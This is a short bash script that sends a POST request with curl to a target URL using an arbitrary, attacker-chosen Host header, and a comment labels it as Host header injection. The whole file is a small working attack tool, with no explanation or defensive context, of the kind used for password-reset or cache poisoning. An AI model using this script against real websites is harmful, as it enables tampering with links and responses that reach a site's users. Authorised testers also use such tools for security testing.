#!/bin/bash

# Check if the correct number of arguments is provided
if [ "$#" -ne 3 ]; then
  echo "Usage: $0 <NEW_HOST> <TARGET_URL> <FORM_DATA>"
  exit 1
fi

# Assign arguments to variables
new_host="$1"
target_url="$2"
form_data="$3"

# Perform the curl request with the Host header injection
curl -v -X POST -H "Host: $new_host" -d "$form_data" "$target_url"
